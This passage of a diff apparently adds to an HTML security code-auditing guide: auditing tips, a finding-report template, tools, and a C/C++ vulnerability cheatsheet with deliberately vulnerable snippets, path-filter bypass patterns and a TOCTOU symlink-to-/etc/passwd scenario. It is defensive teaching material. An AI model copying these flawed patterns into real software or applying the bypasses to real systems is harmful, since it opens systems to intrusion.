+                            <li><strong>Looping Constructs</strong>: Focus on data-processing loops. Check for common errors:
+                                <ul>
+                                    <li>Incorrect terminating conditions (fail to account for buffer sizes, off-by-one errors). Audit Tip: When loops copy data without size validation, check if source can be larger than destination. Audit Tip: Mark exit conditions and manipulated variables; check for inconsistent states, especially on error exits.</li>
+                                    <li>Using post-test (<code>do...while</code>) when pre-test (<code>while</code>, <code>for</code>) is needed, potentially executing the loop body once incorrectly.</li>
+                                    <li>Missing/misplaced <code>break</code> or <code>continue</code> statements.</li>
+                                    <li>Punctuation errors changing loop behavior.</li>
+                                </ul>
+                            </li>
+                            <li><strong>Flow Transfer Statements</strong>: Misuse of <code>break</code> (e.g., breaking from wrong nested structure like <code>if</code> inside <code>switch</code>), <code>continue</code>, <code>goto</code> can lead to unexpected control flow. Check <code>switch</code> statements for missing <code>break</code>s (fallthrough) and missing <code>default</code> cases.</li>
+                            <li><strong>Function Calls</strong>: Analyze calls for:
+                                <ul>
+                                    <li>Misinterpreted/ignored return values (status/error codes, resulting values).</li>
+                                    <li>Incorrectly formatted arguments (type mismatches, wrong intended meaning). Audit Tip: List argument types/meanings, check callers for type conversions (especially sign changes, sign extensions) or incorrect arguments.</li>
+                                    <li>Unexpected updates to arguments passed by reference (side effects). Audit Tip: Note functions altering pass-by-reference arguments or global state; check if callers account for this (e.g., pointers updated after <code>realloc</code>).</li>
+                                    <li>Unexpected global state changes.</li>
+                                </ul>
+                            </li>
+                            <li><strong>Function Audit Logs</strong>: Maintain notes on function purpose, arguments, return values, side effects, potential issues to aid analysis.</li>
+                            <li><strong>Memory Management Auditing</strong>:
+                                <ul>
+                                    <li><strong>ACC Logs</strong>: Use Allocation-Check-Copy logs to track buffer allocation size formulas, size checks applied to data, and copy operations performed on the buffer to spot discrepancies.</li>
+                                    <li><strong>Data Assumptions</strong>: Be skeptical of assumptions about the format/content of binary data, especially proprietary formats; they can be reverse-engineered and manipulated.</li>
+                                    <li><strong>Allocation Functions</strong>: Understand custom allocator behavior; don't assume they are robust. Check handling of edge cases (e.g., zero-size allocation).</li>
+                                </ul>
+                            </li>
+                            <li><strong>String Handling</strong>:
+                                <ul>
+                                    <li><strong>Character Expansion</strong>: Check code encoding special characters; ensure destination buffers are large enough for the <em>expanded</em> string.</li>
+                                    <li><strong>Metacharacters</strong>: Understand how metadata is embedded (in-band) vs. stored separately (out-of-band). In-band metacharacters (like NUL terminators, path separators <code>/</code>, hostname separators <code>.</code>, SQL quotes <code>'</code>) create implicit trust boundaries that parsing routines must handle correctly. Scrutinize code constructing strings from user input (filenames, SQL queries, email addresses, registry paths) for improper sanitization leading to injection attacks.</li>
+                                    <li><strong>Auditing Tip</strong>: Code using <code>snprintf</code> often combines user data with static data; check for potential embedded delimiters or truncation of static parts if user data is too long.</li>
+                                    <li><strong>Auditing Tip</strong>: For format strings, search <code>printf</code>/<code>syslog</code>/<code>err</code> families for non-static format string arguments; trace back to user control. Check wrappers passing varargs too.</li>
+                                    <li><strong>Auditing Tip</strong>: When auditing multicharacter filters (e.g., for <code>../</code>), check for bypasses using embedded patterns (e.g., <code>....//</code>) or incomplete substitution (e.g., <code>s/\.\.\///g</code> in Perl/PHP).</li>
+                                </ul>
+                            </li>
+                            <li><strong>File System Issues (UNIX focus)</strong>:
+                                <ul>
+                                    <li><strong>Auditing Tip</strong>: <code>access()</code> usually indicates a TOCTOU race condition; <code>stat()</code> has similar issues when used on filenames.</li>
+                                    <li><strong>Auditing Tip</strong>: If you find a file descriptor duplication vulnerability, use tools like <code>lsof</code> in a similar environment to see what sensitive FDs might be accessible.</li>
+                                    <li><strong>stat() Family</strong>: Understand <code>stat</code> (follows links), <code>lstat</code> (doesn't follow links), <code>fstat</code> (operates on FD, safest re: races). Know the macros for checking file types (S_ISREG, S_ISDIR, S_ISLNK, etc.).</li>
+                                    <li><strong>Evading Access Checks</strong>: Look for pattern: check function on filename (stat, access) followed by action function on filename (open, chmod, unlink). Safe pattern uses checks/actions on file descriptors (fstat, fchmod after open).</li>
+                                </ul>
+                            </li>
+                        </ul>
+                    </div>
+                </details>
+
+                <details>
+                     <summary>Documenting Findings & Auditor Toolbox</summary>
+                    <div>
+                        <h3 id="documenting-findings">Documenting Findings</h3>
+                        <p>Provide clear and actionable information for each finding:</p>
+                        <ul>
+                            <li><strong>Location</strong>: File, function, line number(s).</li>
+                            <li><strong>Vulnerability Class</strong>: Type (e.g., buffer overflow, integer overflow).</li>
+                            <li><strong>Description</strong>: Explanation of the issue.</li>
+                            <li><strong>Prerequisites</strong>: Conditions required to trigger.</li>
+                            <li><strong>Business Impact</strong>: How it affects the organization/users.</li>
+                            <li><strong>Remediation</strong>: Suggestions for fixing the flaw.</li>
+                            <li><strong>Risk Rating</strong>: Overall risk (e.g., using DREAD: Damage, Reproducibility, Exploitability, Affected Users, Discoverability) incorporating severity and probability.</li>
+                            <li><strong>Severity</strong>: Potential damage if exploited.</li>
+                            <li><strong>Probability</strong>: Likelihood of successful exploitation.</li>
+                            <li><strong>Overall Summary</strong>: Conclude with a general assessment of the application's security posture and observed trends.</li>
+                        </ul>
+
+                        <h3 id="code-auditor-toolbox">Code-Auditor Toolbox</h3>
+                        <p>Essential tools for auditors:</p>
+                        <ul>
+                            <li><strong>Source Code Navigators</strong>: Features: Cross-referencing (definitions/uses), text searching, multi-language support, syntax highlighting, graphing (call trees), scripting. Examples: ctags, cscope, IDEs, Source Insight.</li>
+                            <li><strong>Debuggers</strong>: Features: Kernel debugging, memory searching, scripting, debug symbol support, conditional breakpoints, thread support, on-the-fly assembling, remote debugging. Examples: gdb, WinDbg, OllyDbg, IDA Pro debugger.</li>
+                            <li><strong>Disassemblers/Decompilers</strong>: IDA Pro, Ghidra, Binary Ninja.</li>
+                            <li><strong>Fuzz-Testing Tools</strong>: SPIKE framework, AFL, libFuzzer, Peach Fuzzer.</li>
+                            <li><strong>Automated Code Auditing (SAST)</strong>: Tools vary widely in capability and cost. Examples: SonarQube, Checkmarx, Fortify SCA.</li>
+                            <li><strong>Text Search Utilities</strong>: <code>grep</code>, <code>findstr</code>.</li>
+                        </ul>
+                    </div>
+                </details>
+
+                <h2 id="part-ii-software-vulnerabilities" class="text-2xl md:text-3xl font-bold mt-8 mb-4 border-b border-slate-700 pb-2">Part II: Software Vulnerabilities</h2>
+
+                <details>
+                     <summary>C/C++ Vulnerabilities Cheatsheet & Details</summary>
+                    <div>
+                        <h3 id="c-c-vulnerabilities-cheatsheet-details">C/C++ Vulnerabilities Cheatsheet & Details</h3>
+                        <p><em>(Incorporates <code>cheatsheet_vr.md</code> and details from other files)</em></p>
+
+                        <h4>1. Memory Corruption Vulnerabilities</h4>
+                        <ul>
+                            <li><strong>1.1 Stack Buffer Overflow</strong>
+                                <ul>
+                                    <li>Description: Writing past the allocated boundary of a fixed-size buffer on the stack. Can overwrite return addresses, saved frame pointers, or local variables. Often caused by unsafe functions like <code>strcpy</code>, <code>sprintf</code>, <code>gets</code>, or <code>scanf</code> without bounds checking.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">void vulnerable_function(char *input) {
+    char buffer[10];
+    // scanf("%s", buffer); // Original cheatsheet example uses scanf
+    strcpy(buffer, input); // Stack_BoF.md example uses strcpy
+    printf("Buffer contents: %s\n", buffer);
+}</code></pre>
+                                    </li>
+                                    <li>Algorithm:<pre><code>type VARIABLE[SIZE]
+VARIABLE = (VALUE > SIZE)</code></pre></li>
+                                    <li>SEH Overwrite (Windows Specific): Stack overflows can overwrite Structured Exception Handling (SEH) records, allowing control flow hijack when an exception occurs.</li>
+                                </ul>
+                            </li>
+                             <li><strong>1.2 Heap Buffer Overflow</strong>
+                                <ul>
+                                    <li>Description: Writing past the allocated boundary of a buffer dynamically allocated on the heap (via <code>malloc</code>, <code>calloc</code>, <code>new</code>). Can overwrite heap metadata (chunk headers) or adjacent allocated objects. Caused by unsafe copy functions without bounds checks on heap buffers.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">void vulnerable_function(char *input) {
+    char *buffer = (char *)malloc(10); // Allocate 10 bytes on the heap
+    // scanf("%s", buffer); // Original cheatsheet example uses scanf
+    strcpy(buffer, input); // Heap_BoF.md example uses strcpy
+    printf("Buffer contents: %s\n", buffer);
+    free(buffer);
+}</code></pre>
+                                    </li>
+                                     <li>Algorithm:<pre><code>type *VARIABLE = malloc[SIZE]
+*VARIABLE = (VALUE > SIZE)</code></pre></li>
+                                </ul>
+                            </li>
+                            <li><strong>1.3 Off-by-one errors</strong>
+                                <ul>
+                                    <li>Description: A specific type of bounds error where exactly one byte or element is written past the end of a buffer. Often caused by using <code><=</code> instead of <code><</code> in loop conditions comparing against buffer size, or forgetting space for a null terminator.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">void process_string(char *src) {
+    char dest[32];
+    int i; // Assuming i is declared
+    // Condition allows writing to dest[32] which is out of bounds
+    for (i = 0; src[i] && (i <= sizeof(dest)); i++) {
+        dest[i] = src[i];
+    }
+    // Potential fix: ensure null termination if loop completes
+    // if (i < sizeof(dest)) dest[i] = '\0';
+}</code></pre>
+                                    </li>
+                                    <li>Algorithm:<pre><code>type VARIABLE[SIZE]
+condition: if counter <= sizeof(VARIABLE) then write // Should be <</code></pre></li>
+                                </ul>
+                            </li>
+                            <li><strong>1.4 Memory Leaks</strong>
+                                <ul>
+                                    <li>Description: Allocating memory (e.g., <code>malloc</code>, <code>new</code>) but failing to release it (<code>free</code>, <code>delete</code>) when no longer needed. Consumes available memory, potentially slowing or crashing the system. Primarily an availability issue.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">int main(int argc, char **argv) {
+     int count = 0;
+     int LOOPS = 10;
+     int MAXSIZE = 256;
+     char *pointer = NULL;
+     for(count=0; count<LOOPS; count++) {
+          // Leak: pointer overwritten each loop without freeing previous allocation
+          pointer = (char *)malloc(sizeof(char) * MAXSIZE);
+     }
+     free(pointer); // Only frees the last allocation
+     return count;
+}</code></pre>
+                                    </li>
+                                    <li>Algorithm:<pre><code>loop {
+    type VARIABLE = malloc(sizeof(type))
+}
+// VARIABLE only points to last allocation, previous are lost
+free VARIABLE // Only frees last</code></pre></li>
+                                </ul>
+                            </li>
+                            <li><strong>1.5 Use-After-Free</strong>
+                                <ul>
+                                    <li>Description: Accessing a memory location after it has been freed. Can lead to crashes, data corruption, or code execution if the memory is reused by the allocator for different data/objects. Common causes: error conditions freeing memory early, confusion over ownership/freeing responsibility.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">// Cheatsheet example variation
+char* ptr = (char*)malloc (SIZE);
+int abrt = 0; // Added for example clarity
+if (err) { // Assume 'err' is some error condition
+    abrt = 1;
+    free(ptr);
+}
+// ... later ...
+if (abrt) {
+    // UAF: ptr used after potential free
+    logError("operation aborted before commit", ptr);
+}
+
+// README.md example (conceptual, focuses on heap layout interaction)
+// buf1R1 = malloc(512);
+// buf2R1 = malloc(512);
+// free(buf2R1);
+// buf2R2 = malloc(248); // Might reuse part of freed buf2R1
+// buf3R2 = malloc(248); // Might reuse other part
+// strncpy(buf2R1, argv[1], 511); // UAF: Write to freed buf2R1, potentially corrupting buf2R2/buf3R2 metadata or content.</code></pre>
+                                    </li>
+                                    <li>Algorithm:<pre><code>type VARIABLE = malloc(sizeof(TYPE))
+free VARIABLE
+// ... later usage ...
+use VARIABLE</code></pre></li>
+                                </ul>
+                            </li>
+                             <li><strong>1.6 Double-Free</strong>
+                                <ul>
+                                    <li>Description: Calling <code>free</code> (or <code>delete</code>) more than once on the same pointer. Can corrupt heap metadata, potentially allowing write-what-where primitives. Modern allocators often detect simple double frees, but complex scenarios or custom allocators might still be vulnerable. Also possible via <code>realloc(ptr, 0)</code> on some systems. Be mindful in C++ destructors or complex error handling paths.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">char* ptr = (char*)malloc (SIZE);
+int abrt = 0; // Added for clarity
+// ... some operations ...
+if (abrt) {
+   free(ptr);
+}
+// ... more operations ...
+// Double free if abrt was true
+free(ptr);</code></pre>
+                                    </li>
+                                    <li>Algorithm:<pre><code>type VARIABLE = malloc(sizeof(TYPE))
+free VARIABLE
+...
+free VARIABLE</code></pre></li>
+                                </ul>
+                            </li>
+                            <li><strong>1.7 Out-Of-Bounds Write</strong>
+                                <ul>
+                                    <li>Description: Writing data past the end or before the beginning of the intended buffer. This is a general case including stack/heap overflows and incorrect array indexing.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">// OOBW.md example
+int buffer[5];
+int index;
+printf("Enter an index (0-4): ");
+scanf("%d", &index);
+// No bounds check on index
+buffer[index] = 42; // OOB Write if index < 0 or index >= 5
+
+// Cheatsheet example
+// int id_sequence[3]; // Valid indices: 0, 1, 2
+// id_sequence[3] = 456; // OOB Write</code></pre>
+                                    </li>
+                                    <li>Algorithm:<pre><code>type VARIABLE[SIZE]
+VARIABLE[INDEX] = VALUE // Where INDEX >= SIZE or INDEX < 0</code></pre></li>
+                                </ul>
+                            </li>
+                            <li><strong>1.8 Uninitialized Data Access</strong>
+                                <ul>
+                                    <li>Description: Reading data from a variable or memory location that has not been explicitly initialized. The variable holds residual data from previous memory use, leading to unpredictable behavior or information leakage. Check all code paths, especially error paths, to ensure variables are initialized before use.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">void vuln_func(int val){ // Example shows passing uninit var, read is implicit
+     printf("Value: %d\n", val); // Reading uninitialized 'i' from main
+}
+int main() {
+    int i; // 'i' is uninitialized
+    vuln_func(i); // Pass uninitialized var (C passes by value, but concept applies)
+    // Better example: Reading an uninitialized local variable directly
+    // char buffer[10];
+    // if (condition) { strcpy(buffer, "init"); }
+    // printf("%s", buffer); // Potential read of uninitialized data if condition false
+    return 0;
+}</code></pre>
+                                    </li>
+                                    <li>Algorithm:<pre><code>type VARIABLE
+... // No assignment to VARIABLE
+func_read(VARIABLE) // use of uninitialized VARIABLE</code></pre></li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h4>2. Pointer Manipulation</h4>
+                        <ul>
+                            <li><strong>2.1 Null-Pointer Dereference</strong>
+                                <ul>
+                                    <li>Description: Attempting to read from or write to address 0 (NULL). Typically causes a crash (DoS).</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">char *ptr = NULL;
+// Dereference happens inside the function call if it uses the pointer
+// function_call(ptr);
+// Or directly:
+*ptr = 'a'; // Crash
+char c = *ptr; // Crash</code></pre>
+                                    </li>
+                                    <li>Algorithm:<pre><code>type *VARIABLE = NULL
+*VARIABLE = ... // or ... = *VARIABLE</code></pre></li>
+                                </ul>
+                            </li>
+                            <li><strong>2.2 Dangling Pointers</strong>
+                                <ul>
+                                    <li>Description: A pointer that references memory that has been freed or is no longer valid (e.g., points to a local variable whose scope has ended). Using it leads to behavior similar to Use-After-Free.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">char *dp = NULL;
+{
+   char c = 'x';
+   dp = &c;
+} // c goes out of scope, its stack memory can be reused
+// dp now points to invalid stack memory
+// *dp = 'y'; // Undefined behavior, potential corruption</code></pre>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li><strong>2.3 Uninitialized Pointers</strong>
+                                <ul>
+                                    <li>Description: Using a pointer variable before it has been assigned a valid memory address. It points to an arbitrary location; dereferencing leads to crashes or unpredictable behavior.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">int *i; // Uninitialized pointer
+// Passing address of uninitialized pointer is different, perhaps meant:
+// int *ptr;
+// *ptr = 5; // Dereferencing uninitialized pointer -> Crash/Corruption
+
+// Cheatsheet example seems flawed, perhaps intended:
+// vuln_func(i); // Passing the uninitialized pointer itself</code></pre>
+                                    </li>
+                                    <li>Algorithm:<pre><code>type *DATA;
+// Dereference DATA before assignment
+*DATA = ... // or ... = *DATA</code></pre></li>
+                                </ul>
+                            </li>
+                            <li><strong>2.4 Pointer Arithmetic Issues</strong>
+                                <ul>
+                                    <li>Description: Errors arising from misunderstanding how pointer arithmetic works in C/C++. Operations (+, -) scale by the size of the data type pointed to. Comparing pointers compares addresses. Adding pointers is invalid; subtracting pointers (of same type) yields the element difference (ptrdiff_t). Common bugs involve using byte offsets when element offsets are needed, or <code>sizeof(pointer)</code> instead of <code>sizeof(buffer)</code>.</li>
+                                    <li>Example (Scaling):
+                                        <pre><code class="language-c">short *j;
+j = (short *)0x1000; // Example address
+j = j + 1; // j now points to 0x1002 (assuming short is 2 bytes)</code></pre>
+                                    </li>
+                                    <li>Example (Sizeof misuse):
+                                        <pre><code class="language-c">int buf[1024];
+int *b = buf;
+// Incorrect check: adds byte size to pointer, comparison is scaled
+// while (havedata() && b < buf + sizeof(buf)) { *b++=val; }
+// Correct check (usually): compare against end pointer
+while (havedata() && b < &buf[1024]) { *b++=val; }
+// Or use index: for(i=0; i<1024; i++) buf[i]=val;</code></pre>
+                                    </li>
+                                    <li>Auditing Tip: Check arithmetic involving pointers; verify the operation aligns with the implicit scaling based on pointer type. Look for incorrect <code>sizeof</code> usage (pointer vs buffer).</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                         <h4>3. Concurrency and Synchronization</h4>
+                        <ul>
+                            <li><strong>3.1 Race Conditions</strong>
+                                <ul>
+                                    <li>Description: Outcome depends on the unpredictable sequence or timing of concurrent operations, often involving shared resources accessed without proper locking. Can lead to corrupted data, crashes, or security bypasses.</li>
+                                    <li>Example (Shared Queue without Locks):
+                                        <pre><code class="language-c">// Conceptual - from cheatsheet, simplified
+struct element *queue = NULL; // Shared resource
+
+void enqueue(struct element *new_obj) {
+    // ... find end of queue ... (Needs locking)
+    // tmp->next = new_obj; (Needs locking)
+}
+
+struct element* dequeue() {
+    // if (queue == NULL) ... (Needs locking)
+    // elem = queue; (Needs locking)
+    // queue = queue->next; (Needs locking)
+    // return elem;
+}
+// Problem: If dequeue reads 'queue' just before another thread sets it to NULL,
+// or if two threads dequeue simultaneously, errors occur.</code></pre>
+                                    </li>
+                                    <li><strong>TOCTOU (Time-of-Check to Time-of-Use)</strong>: A specific race where a check is performed on a resource, but the resource changes state before it's used. Common with filesystem operations.
+                                        <ul>
+                                            <li>Example: <code>if (access("file", W_OK) == 0) { fd = open("file", O_WRONLY); }</code> - Attacker could change "file" (e.g., make it a symlink to /etc/passwd) between <code>access</code> and <code>open</code>.</li>
+                                            <li>Auditing Tip: <code>access()</code>/<code>stat()</code> on filenames are suspect; prefer checks on file descriptors (<code>fstat</code>) after opening.</li>
+                                        </ul>
+                                    </li>
+                                    <li><strong>Filesystem Races (UNIX)</strong>:
+                                        <ul>
+                                            <li>Permission Races: File created with weak permissions, then fixed; attacker opens during the window.</li>
+                                            <li>Ownership Races: File created by non-priv user, then <code>chown</code>ed to priv user; attacker acts during window.</li>
+                                            <li>Directory Races: Attacker manipulates directory structure (e.g., replaces dir with symlink) while privileged process traverses it.</li>
+                                        </ul>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li><strong>3.2 Starvation and Deadlocks</strong>
+                                <ul>
+                                    <li>Description:
+                                        <ul>
+                                            <li><strong>Starvation</strong>: A thread is perpetually denied access to necessary resources.</li>
+                                            <li><strong>Deadlock</strong>: Two or more threads block each other indefinitely, each waiting for a resource held by another. Requires: Mutual Exclusion, Hold and Wait, No Preemption, Circular Wait. Can also occur if locks aren't released due to errors.</li>
+                                        </ul>
+                                    </li>
+                                    <li>Example (Deadlock - Incorrect Lock Ordering):
+                                        <pre><code class="language-c">// mutex1, mutex2 are shared locks
+void thread1() {
+    lock(mutex1);
+    // ...
+    lock(mutex2); // Might block if thread2 holds mutex2
+    // ...
+    unlock(mutex2);
+    unlock(mutex1);
+}
+void thread2() {
+    lock(mutex2);
+    // ...
+    lock(mutex1); // Might block if thread1 holds mutex1
+    // ...
+    unlock(mutex1); // Note: Cheatsheet had unlock(mutex2) here, likely typo
+    unlock(mutex2);
+}
+// Deadlock if thread1 locks mutex1, thread2 locks mutex2, then both try to lock the other.</code></pre>
+                                    </li>
+                                </ul>
+                            </li>
+                             <li><strong>3.3 Inadequate Locking</strong>
+                                <ul>
+                                    <li>Description: Failing to acquire necessary locks, holding locks for too short a duration, or using the wrong type of lock when accessing shared resources, allowing race conditions.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">// Conceptual - based on cheatsheet example description
+pthread_mutex_t mutex;
+void *thread_func(void *arg) {
+  // Lock should cover all accesses to shared data, not just part.
+  // If shared_data is accessed before lock or after unlock, it's inadequate.
+  pthread_mutex_lock(&mutex);
+  // access_shared_data_part1();
+  pthread_mutex_unlock(&mutex); // Released too early?
+  // access_shared_data_part2(); // Unprotected access
+  return NULL;
+}</code></pre>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li><strong>3.4 Re-entrancy</strong>
+                                <ul>
+                                    <li>Description: A function is non-reentrant if it cannot be safely interrupted and called again (by another thread or signal handler) before the first call completes. Often due to reliance on shared state (global/static variables) without proper locking or use of non-reentrant library functions.</li>
+                                    <li>Example:
+                                        <pre><code class="language-c">// Cheatsheet example conceptual
+double account_balance = 1000.0; // Shared state
+
+void process_transaction(double amount) {
+    // Non-reentrant section if called concurrently without locks
+    double current_balance = account_balance;
+    // Interruption here by another thread calling process_transaction
+    // could lead to incorrect final balance.
+    current_balance += amount;
+    // Simulate work
+    account_balance = current_balance;
+}</code></pre>
+                                    </li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h4>4. Arithmetic Boundary Vulnerabilities</h4>
+                         <ul>
+                            <li><strong>4.1 Unsigned Integer Boundaries (Wrap Around)</strong>
+                                <ul>
+                                    <li>Description: Unsigned integers wrap around on overflow (large value becomes small) or underflow (small value becomes large). Exploitable if used in size calculations where overflow leads to small allocation followed by large copy, or in security checks.</li>
+                                    <li>Example (Allocation Size Overflow):
+                                        <pre><code class="language-c">// From Art of VR description
+unsigned int width = 0x400, height = 0x1000001;
+unsigned int n = width * height; // n overflows to 0x400 (1024)
+char *buf = (char *)malloc(n); // Allocates only 1024 bytes
+for (int i=0; i < height; i++) // Loop runs height times (>> 1024)
+    memcpy(&buf[i*width], init_row, width); // Massive heap overflow</code></pre>
+                                    </li>
+                                    <li>Example (Multiplication Overflow before Allocation):
+                                        <pre><code class="language-c">// From Art of VR description (SSH exploit)
+u_int nresp = 0x40000020; // Large number from packet
+// nresp * sizeof(char*) = 0x40000020 * 4 = 0x100000080
+// Overflows to 0x80 (128) on 32-bit system
+response = xmalloc(nresp * sizeof(char*)); // Allocates only 128 bytes
+for (i = 0; i < nresp; i++) // Loop runs 0x40000020 times
+    response[i] = packet_get_string(NULL); // Massive heap overflow</code></pre>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li><strong>4.2 Signed Integer Boundaries (Overflow/Underflow)</strong>
+                                <ul>
+                                    <li>Description: Signed integer overflow/underflow behavior is technically undefined in C/C++, but often wraps around (implementation-defined). Can be exploited to bypass security checks, especially those comparing against maximum size limits. Adding 1 to MAX_INT can result in MIN_INT (negative).</li>
+                                    <li>Example (Bypassing Length Check):
+                                        <pre><code class="language-c">// From Art of VR description
+#define MAXCHARS 1024
+int length = 0x7FFFFFFF; // Max signed int
+// Check 1: length < 0 -> false
+// Check 2: length + 1 >= MAXCHARS
+//   length + 1 = 0x7FFFFFFF + 1 = 0x80000000 (MIN_INT, negative)
+//   negative >= MAXCHARS -> false
+// Check bypassed!
+if(length < 0 || length + 1 >= MAXCHARS) { /* error */ }
+// read(sockfd, buf, length); // read called with huge positive length</code></pre>
+                                    </li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h4>5. Type Conversion Vulnerabilities</h4>
+                        <ul>
+                            <li><strong>5.1 Signed/Unsigned Conversion Issues</strong>
+                                <ul>
+                                    <li>Description: Implicit conversions between signed and unsigned types, often during comparisons or assignments. Passing negative signed integers to functions expecting unsigned sizes (<code>size_t</code>) results in large positive values. Comparisons between signed and unsigned types usually promote the signed operand to unsigned, potentially bypassing checks.</li>
+                                    <li>Rule: If operands include float, convert to float. Otherwise, perform integer promotions (char/short -> int). If types still differ, convert operand with lower rank to type of higher rank; if ranks equal and one is unsigned, convert signed to unsigned.</li>
+                                    <li>Example (Comparison Promotion):
+                                        <pre><code class="language-c">int jim = -5;
+// sizeof(int) is unsigned size_t, has higher rank than signed int.
+// jim is converted to unsigned before comparison.
+if (jim < sizeof(int)) // Comparison is effectively (unsigned)-5 < 4
+     do_something();  // This will likely NOT be called.</code></pre>
+                                    </li>
+                                    <li>Auditing Tip: Look for signed integers passed to functions expecting <code>size_t</code> (read, memcpy, malloc, strncpy etc.). Check comparisons involving mixed signed/unsigned types, especially with <code>sizeof</code> or <code>strlen</code> results.</li>
+                                </ul>
+                            </li>
+                            <li><strong>5.2 Sign Extension</strong>
+                                <ul>
+                                    <li>Description: Converting a smaller signed type (char, short) to a larger signed type (int, long) copies the sign bit into the new higher-order bits. A negative char (-1, 0xFF) becomes a negative int (-1, 0xFFFFFFFF). Can cause issues if the extended value is used in calculations or passed to functions expecting unsigned values.</li>
+                                    <li>Example (Passed to snprintf):
+                                        <pre><code class="language-c">char len = -1; // Value 0xFF from network maybe
+// len promoted to int 0xFFFFFFFF (-1)
+snprintf(dst, len, "%s", src); // snprintf receives negative size</code></pre>
+                                    </li>
+                                    <li>Example (DNS Packet Parsing):
+                                        <pre><code class="language-c">// Conceptual from Art of VR BIND example
+char count = (char)*indx; // Read signed char length byte
+// If count is negative (e.g., -1 / 0xFF), sign extension occurs when used
+// in contexts expecting int.
+// strncat(nameStr, (char *)indx, count); // count promoted to int -1
+// If strncat interprets negative size as very large -> overflow</code></pre>
+                                    </li>
+                                    <li>Auditing Tip: Focus on signed <code>char</code> or <code>short</code> used in contexts promoting them to <code>int</code> (arithmetic, comparisons, function args). Check assembly for <code>movsx</code> instruction.</li>
+                                </ul>
+                            </li>
+                            <li><strong>5.3 Truncation</strong>
+                                <ul>
+                                    <li>Description: Converting a larger integer type to a smaller type discards the most significant bits. Can bypass size checks if a large value is truncated to a small one before the check or copy.</li>
+                                    <li>Example (strlen result truncated):
+                                        <pre><code class="language-c">unsigned short f; // 16-bit
+char mybuf[1024];
+char *userstr = getuserstr(); // Assume returns string > 65535 chars
+// strlen returns size_t (e.g., 32/64-bit), maybe 66000
+f = strlen(userstr); // Truncation: f becomes 66000 % 65536 = 464
+if (f > sizeof(mybuf)-5) // Check is 464 > 1019 -> false
+    die("string too long!");
+// Check bypassed, large userstr overflows mybuf
+strcpy(mybuf, userstr);</code></pre>
+                                    </li>
+                                    <li>Auditing Tip: Look for assignments from larger types (int, size_t) to smaller types (short, char), especially when used for lengths or sizes. Check struct definitions.</li>
+                                </ul>
+                            </li>
+                             <li><strong>5.4 Comparisons </strong>
+                                <ul>
+                                    <li>Description: Implicit type conversions during comparisons are a major source of bugs. Promotion of signed to unsigned is common when comparing against <code>size_t</code> or other unsigned types.</li>
+                                    <li>Example (Signed vs Unsigned size_t):
+                                        <pre><code class="language-c">short length = 1; // From network
+// sizeof(short) is size_t (unsigned)
+// In (length - sizeof(short)), length promoted to int, then converted to unsigned size_t
+// Result of subtraction is unsigned.
+if (length - sizeof(short) <= 0) // Unsigned result can never be <= 0 (unless 0)
+{ /* This check is ineffective for small positive lengths */ }
+// read(sockfd, buf, length - sizeof(short)); // If length=1, read size becomes (unsigned)(1-2) = large value</code></pre>
+                                    </li>
+                                    <li>Example (Signed vs Unsigned Max Check):
+                                        <pre><code class="language-c">unsigned short max = 1024;
+short length = -5; // From network
+// Both promoted to int for comparison.
+// Check is effectively (-5 > 1024) -> false. Check bypassed.
+if(length > max) { /* error */ }
+// read(sockfd, buf, length); // read gets negative length -> interpreted as large unsigned size_t</code></pre>
+                                    </li>
+                                    <li>Auditing Tip: Scrutinize comparisons protecting memory operations. Track variable types carefully. Watch for <code>sizeof</code>, <code>strlen</code>. Comparisons like <code>if (unsigned_var < 0)</code> are suspicious.</li>
+                                </ul>
+                            </li>
+                            <li><strong>5.5 Operators </strong>
+                                <ul>
+                                    <li><strong>Subtraction</strong>: Integer promotions happen <em>before</em> the operation. <code>(unsigned short)1 - 5</code> is calculated as <code>(int)1 - (int)5 = -4</code>. The result type affects subsequent comparisons or assignments.</li>
+                                    <li><strong>Division/Modulus</strong>: Signed division/modulus with negative operands can yield negative results (implementation-defined prior to C99, typically rounds towards zero or negative infinity). If a negative result is used in size calculations (e.g., <code>malloc(len/8 + 1)</code>), it could lead to allocating 0 or small amount, followed by operations assuming larger buffer.</li>
+                                    <li><strong>Right Shift</strong>: Right shifting (<code>>></code>) a signed negative value performs an <em>arithmetic</em> shift, preserving the sign bit (filling with 1s). If a logical shift (filling with 0s) was expected, this can lead to unexpected large negative or positive values depending on context. Check assembly: <code>sar</code> (arithmetic) vs <code>shr</code> (logical).</li>
+                                    <li>Auditing Tip: Check operands for signed division, modulus, right shift. Can user input control operands to be negative?</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                        <h4>6. Information Disclosure</h4>
+                        <ul>
+                            <li><strong>6.1 Memory Disclosure</strong>
+                                <ul>
+                                    <li>Description: Leaking contents of memory, often due to missing bounds checks on reads, use of uninitialized memory, or incorrect handling of internal data structures. Heartbleed (OpenSSL) was a famous example where missing bounds check allowed reading arbitrary server memory.</li>
+                                    <li>Example: (Conceptual based on cheatsheet description of OpenSSL flaw)
+                                        <pre><code class="language-c">// If SSL_read has an internal flaw allowing read past intended data
+// due to error condition mishandling or bad length calculation,
+// buffer might contain adjacent memory contents.
+bytes_read = SSL_read(ssl, buffer, sizeof(buffer)); // Printing buffer leaks unintended data.
+</code></pre>
+                                    </li>
+                                </ul>
+                            <li><strong>6.3 Debug Information Leakage</strong>
+                                <ul>
+                                    <li>Description: Accidentally exposing internal state, variable values, or verbose logs intended only for debugging. Often happens when debug code is left enabled in production builds or triggered by specific inputs.</li>
